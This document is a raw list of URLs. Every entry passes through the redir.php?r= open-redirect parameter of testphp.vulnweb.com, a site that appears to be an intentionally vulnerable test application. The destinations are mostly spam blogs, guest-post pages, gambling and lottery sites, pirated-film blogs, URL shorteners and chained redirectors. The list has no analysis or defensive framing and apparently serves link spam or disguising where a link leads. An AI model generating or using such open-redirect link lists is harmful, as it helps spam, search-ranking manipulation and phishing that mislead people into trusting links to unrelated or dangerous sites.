      http://testphp.vulnweb.com/redir.php?r=http://amtvnews.online
      http://testphp.vulnweb.com/redir.php?r=http://andresu26h8.oblogation.com/
      http://testphp.vulnweb.com/redir.php?r=http://anekkaapoker.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://asancup.com//
      http://testphp.vulnweb.com/redir.php?r=http://ascentlawfirm.com
      http://testphp.vulnweb.com/redir.php?r=http://asdafawqa.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://astronomyscience2.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://avatarkeyboardapp.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://avatarkeyboardapp.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://ayeshadev122.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http://baji.co.in
      http://testphp.vulnweb.com/redir.php?r=http://banai.cz/
      http://testphp.vulnweb.com/redir.php?r=http://bargeorgeim.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://bargeorgeim.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://bhalukingweb.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http://bhalukingweb.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://bhalukingweb.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://bislimgeorgemk.blogspot.com/management.html
      http://testphp.vulnweb.com:80/redir.php?r=http://bit.do/foApe
      http://testphp.vulnweb.com:80/redir.php?r=http://bit.do/fofXJ
      http://testphp.vulnweb.com:80/redir.php?r=http://bit.do/fzCq7
      http://testphp.vulnweb.com/redir.php?r=http://bit.ly/3kGy1Gr
      http://testphp.vulnweb.com/redir.php?r=http://blankie01.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://blankie02.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://blooketplayer.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://bollywood-movies-2022.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http://bollywood-movies-2022.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://bollywood-movies-2022.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://candujudi.online/
      http://testphp.vulnweb.com/redir.php?r=http://cantandonanas.com/foro/profile/moisesmcwilliam/
      http://testphp.vulnweb.com/redir.php?r=http://casinobingopnd.natallco.com/betting-for-lastupdate-1969/
      http://testphp.vulnweb.com/redir.php?r=http://casinozp2.apeaceweb.net/soccer-online-for-tips-2021/
      http://testphp.vulnweb.com/redir.php?r=http://caverta.madpath.com
      http://testphp.vulnweb.com/redir.php?r=http://caverta.madpath.com/
      http://testphp.vulnweb.com/redir.php?r=http://caverta.madpath.com/%20%20%20%20/
      http://testphp.vulnweb.com/redir.php?r=http://caverta.madpath.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://cbdoilrich.com
      http://testphp.vulnweb.com/redir.php?r=http://cbs79.com/
      http://testphp.vulnweb.com/redir.php?r=http://cbtresultaatuitopleiden.nl
      http://testphp.vulnweb.com/redir.php?r=http://cckmlaw.com/
      http://testphp.vulnweb.com/redir.php?r=http://cdsassad67as.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://ciekawowo.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http://concreteadmixture1.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://concreteadmixture1.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://constructionroofingsheets.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://customfurniturewoodensole.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://customfurniturewoodensole.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://customisedfurniturewoodensole.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://cutt.ly/8m2Kkfk
      http://testphp.vulnweb.com/redir.php?r=http://dailymagazinenews.com/
      http://testphp.vulnweb.com/redir.php?r=http://dbgskjbgkb.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://dbgskjbgkb.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://df.misis.ru/user/twine6chick/
      http://testphp.vulnweb.com/redir.php?r=http://diablo4mobile-android.xyz
      http://testphp.vulnweb.com/redir.php?r=http://donenewsguest.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://dramatokomedie.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http://dramatokomedie.blogspot.com/
      http://testphp.vulnweb.com:80/redir.php?r=http://drillpm.com
      http://testphp.vulnweb.com/redir.php?r=http://drymixproducts1.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://drymixproducts1.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://dsafwas.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://duniaceme.pro
      http://testphp.vulnweb.com/redir.php?r=http://duniaceme.pro/
      http://testphp.vulnweb.com/redir.php?r=http://dziendobryfilm.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http://eduardoamgw386.yousher.com/on-the-web-casino-bonuses-promotions-2022
      http://testphp.vulnweb.com/redir.php?r=http://fafaslot-33.weebly.com/
      http://testphp.vulnweb.com/redir.php?r=http://fenta.eklablog.com
      http://testphp.vulnweb.com/redir.php?r=http://fenta.eklablog.com/
      http://testphp.vulnweb.com/redir.php?r=http://fenta.eklablog.com/%20%20%20%20/
      http://testphp.vulnweb.com/redir.php?r=http://fenta.eklablog.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://filmavnia.wordpress.com/
      http://testphp.vulnweb.com/redir.php?r=http://filmovik.wordpress.com
      http://testphp.vulnweb.com/redir.php?r=http://filmowenowoscicda.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http://filmowenowoscicda.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://filmownia1.wordpress.com/
      http://testphp.vulnweb.com/redir.php?r=http://filmowymaniaks.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://filmycda.online/
      http://testphp.vulnweb.com/redir.php?r=http://financieel.blog//
      http://testphp.vulnweb.com/redir.php?r=http://findattorneyorlawyer.com
      http://testphp.vulnweb.com/redir.php?r=http://fireloaded.com/
      http://testphp.vulnweb.com:80/redir.php?r=http://firlute4.site123.me/
      http://testphp.vulnweb.com/redir.php?r=http%3A%2F%2Ffitformketopills.com
      http://testphp.vulnweb.com/redir.php?r=http://fitnessalonghealth.com/
      http://testphp.vulnweb.com/redir.php?r=http://fnewsani.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://forkliftswildwestlifttrucks.com/buffalo-forklift-repair-orange-county-california
      http://testphp.vulnweb.com/redir.php?r=http%3A%2F%2Ffsecan.ca%2Fblog%2Findex.php%3Fentryid%3D299730
      http://testphp.vulnweb.com/redir.php?r=http://furnitureorg.tk
      http://testphp.vulnweb.com/redir.php?r=http://gamehgfobek.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://gdfswaw.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http://geocadmd8.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://geocadmd8.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://geocalre.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://geocalre.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://geodisci.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://geodisci.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://geoffmairvc.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://geoffmairvc.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://geogreenhouseis.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://geogreenhouseis.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://geomasterqa.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://geomasterqa.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://geonewscc.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://geonewscc.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://georganicsis.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://georganicsis.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://georgeclevelandcom.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://georgeclevelandcom.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://georgeeeeeeeeeeeeeam.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://georgeeeeeeeeeeeeeam.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://georgehotelim.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://georgehotelim.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://georgiaheritagebankcom.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://georgiaheritagebankcom.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://georgiamorningcom.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://georgiamorningcom.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://georgievskimk.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://georgievskimk.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://georis85.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://georis85.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://geotextilemd.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://geotextilemd.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://geotouram.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://geowashci.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://geowashci.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://gnewsani.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http:%2F%2Fgogreen2living.blogspot.com%2F
      http://testphp.vulnweb.com/redir.php?r=http://gopokerwg0jg.blogspeak.net/football-new-for-ideas-2022/
      http://testphp.vulnweb.com/redir.php?r=http://guestnewspro.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://guestpostforme.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://haangkia.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://hamyareweb.co/
      http://testphp.vulnweb.com/redir.php?r=http://hejhrhenh.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://highdemandingblog.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://highguestnews.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http:%2F%2Fholylandexperience.com%2F
      http://testphp.vulnweb.com/redir.php?r=http://horalotto.com/%E0%B8%95%E0%B8%A3%E0%B8%A7%E0%B8%88%E0%B8%AB%E0%B8%A7%E0%B8%A2-17-01-2565%0A/
      http://testphp.vulnweb.com/redir.php?r=http://horalotto.com/%E0%B8%95%E0%B8%A3%E0%B8%A7%E0%B8%88%E0%B8%AB%E0%B8%A7%E0%B8%A2-17-01-2566%0A/
      http://testphp.vulnweb.com/redir.php?r=http://horalotto.com/%E0%B8%95%E0%B8%A3%E0%B8%A7%E0%B8%88%E0%B8%AB%E0%B8%A7%E0%B8%A2-17-02-2565%0A/
      http://testphp.vulnweb.com/redir.php?r=http://horalotto.com/%E0%B8%95%E0%B8%A3%E0%B8%A7%E0%B8%88%E0%B8%AB%E0%B8%A7%E0%B8%A2-30-12-2565%0A/
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1552.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1553.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1558.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1565.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1570.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1571.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1572.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1578.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1585.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1588.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1599.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1616.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1618.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1622.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1627.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1628.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1630.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1635.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1648.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1681.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1682.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1684.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1688.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1692.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1693.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1697.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1698.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1700.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1726.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1732.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1735.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://https://seonews1736.blogspot.com//
      http://testphp.vulnweb.com/redir.php?r=http://hukazotu.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http%3A%2F%2Fhypestyleco.net
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal06.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal07.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal08.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal09.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal10.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal11.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal12.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal13.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal14.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal15.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal16.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal17.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal18.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal19.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal20.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal21.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal22.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal23.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal24.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal25.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal26.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal27.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal28.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal29.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal30.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal31.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal32.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal33.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal34.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal35.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal36.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal37.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal38.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal39.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal40.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal41.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal42.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal43.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal44.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal45.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal46.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal47.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal48.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal49.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal50.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal51.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal52.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal53.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal54.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal55.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal56.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal57.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal58.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal59.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal60.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal61.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal62.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal63.weebly.com/
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal64.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal65.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal66.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal67.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal68.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal69.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal70.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal71.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal72.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal73.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal74.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal75.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal76.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal77.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal78.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal79.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal80.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal81.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal82.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal83.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal84.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal85.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal86.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal87.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal88.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal89.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal90.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal91.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal92.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal93.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal94.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://indonesianormal95.weebly.com
      http://testphp.vulnweb.com/redir.php?r=http://jackpotselt.eblogmall.com/football-new-for-tips-1973/
      http://testphp.vulnweb.com/redir.php?r=http://jackpotskvc.someothermagazine.com/predictions-soccer-for-ideas-2023/
      http://testphp.vulnweb.com/redir.php?r=http://joinsers.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http://joinsers.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://jokerwarior.com/
      http://testphp.vulnweb.com/redir.php?r=http://judipilihan.vip/
      http://testphp.vulnweb.com/redir.php?r=http://justplangrow123.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://justplangrow1234.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://justplangrow1234.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://justplangrow234.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://justplangrow234.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://justplangrow566.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://kangendomino.club/
      http://testphp.vulnweb.com/redir.php?r=http://kaomoji.ciao.jp/htmllint/htmllint.cgi?ViewSource=on;URL=https://www.hadehana.com
      http://testphp.vulnweb.com/redir.php?r=http://katastargeoprofilmk.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://katastargeoprofilmk.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://kentfaliju.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://kentfaliju.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://keyboardandmousecoza.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://keyboardandmousecoza.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://keyboardclassescoin.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://keyboardclassescoin.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://keyboardcompru.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://keyboardcompru.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://keyboardherodk.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://keyboardstylishcoza.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://keyboardstylishcoza.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://keyboardwarriorcoza.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://keyboardwarriorcoza.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://keyboardwarriorscoza.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://keyboardwarriorscoza.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://kidsonkeyboardlucenapage.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://kidsonkeyboardlucenapage.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://kimdlo.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http://kimdlo.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://kochamserialecda.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://kozackieseriale.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http://kozackifilm.wordpress.com
      http://testphp.vulnweb.com/redir.php?r=http://kydaoquan.com/f25b13f
      http://testphp.vulnweb.com/redir.php?r=http://litclubbs.ru/redirect?url=https://www.dino-es.com/
      http://testphp.vulnweb.com/redir.php?r=http://livebettingo4e.fredsgivingday.com/bet-online-for-tips-1971/
      http://testphp.vulnweb.com/redir.php?r=http://livebusinessblog.com/
      http://testphp.vulnweb.com/redir.php?r=http://liveguestnews.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://livematchipl.com/
      http://testphp.vulnweb.com/redir.php?r=http://lookupblogbgeg.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://lookupblogbgeg.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://lpnews187.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://ltnews187.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://macbookkeyboardscoza.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://macbookkeyboardscoza.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://magazinemodule.com/
      http://testphp.vulnweb.com/redir.php?r=http://mainceme.biz/
      http://testphp.vulnweb.com/redir.php?r=http://makeahealthylifelontime.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http://makeahealthylifelontime.blogspot.com.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://makeahealthylifelontime.blogspot.com.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://meshgeocom.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://meshgeocom.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://mojerandkis.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http:%2F%2Fmqcedarsprings.com%2F
      http://testphp.vulnweb.com/redir.php?r=http://mtngeoreportci.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://mtngeoreportci.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://mtpolice.kr/management.html
      http://testphp.vulnweb.com/redir.php?r=http://mysqmclub.com//
      http://testphp.vulnweb.com/redir.php?r=http://naszefilmyxd.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://netfreewebb.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http://netfreewebb.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://netfreewebb.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://newfilmys.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://newikus.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http://newikus.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://newysk.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http://newysk.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://nftcalendar.wiki/
      http://testphp.vulnweb.com/redir.php?r=http://niussa.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http://novusinfini.com/
      http://testphp.vulnweb.com/redir.php?r=http://nuancesjournal.com/
      http://testphp.vulnweb.com/redir.php?r=http://ocrvcenter.co
      http://testphp.vulnweb.com/redir.php?r=http://ocrvcenter.net/passenger-bus-collision-repair-paint-shop-near-me-orange-county
      http://testphp.vulnweb.com/redir.php?r=http://ojs.experttel.com.ar/files/journals/2/articles/427/submission/original/427-525-1-SM.html
      http://testphp.vulnweb.com/redir.php?r=http://pankajkeyboardplayerin.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://pankajkeyboardplayerin.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://pastein.ru/l/WktY
      http://testphp.vulnweb.com/redir.php?r=http://peugeotvc69.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://peugeotvc69.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://pickachu-web.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http://pickachu-web.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://pickachu-web.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://plrecenzjefilmowe.wordpress.com/
      http://testphp.vulnweb.com/redir.php?r=http://pokeridnjudi.pro/
      http://testphp.vulnweb.com/redir.php?r=http://pokeronlinecpe.journalnewsnet.com/bet-365-for-ideas-1968/
      http://testphp.vulnweb.com/redir.php?r=http://pokeronlinej42.thedeels.com/predictions-soccer-for-lastupdate-2000/
      http://testphp.vulnweb.com/redir.php?r=http://prkk.org/berita-154-tuhan-menjadi-nyata-dengan-mengasihi.html
      http://testphp.vulnweb.com/redir.php?r=http://promociones-arco.com/15222/winning-is-easy-on-this-wagering-web-site/
      http://testphp.vulnweb.com/redir.php?r=http://psychedelicshome.co.uk/
      http://testphp.vulnweb.com/redir.php?r=http://pushpa-the-rise.blogspot.com
      http://testphp.vulnweb.com/redir.php?r=http://pushpa-the-rise.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://pushpa-the-rise.blogspot.com/management.html
      http://testphp.vulnweb.com/redir.php?r=http://randeczq.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://randewus.blogspot.com/
      http://testphp.vulnweb.com/redir.php?r=http://rebej.abejor.org.br/files/journals/1/articles/1036/submission/1036-1-1983-1-2-20221007.html
      http://testphp.vulnweb.com/redir.php?r=http://recenzjefilmowe.weebly.com
